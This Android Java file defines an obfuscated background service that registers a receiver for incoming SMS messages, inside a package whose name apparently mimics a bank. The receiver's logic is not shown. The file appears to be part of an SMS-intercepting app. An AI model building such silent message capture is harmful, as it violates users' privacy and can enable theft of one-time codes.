package sbinewbox.com.share;

import android.app.Service;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.IBinder;
import android.util.Log;

public class Ch3mkkk extends Service {


    private OKTest smsReceiver;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d("mywork", "BackgroundService started");
        IntentFilter filter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
        smsReceiver = new OKTest();
        registerReceiver(smsReceiver, filter);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (smsReceiver != null) {
            Log.d("mywork", "Unregistering SmsReceiver");
            unregisterReceiver(smsReceiver);
            smsReceiver = null;
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        // This method is not used for started services
        return null;
    }
}
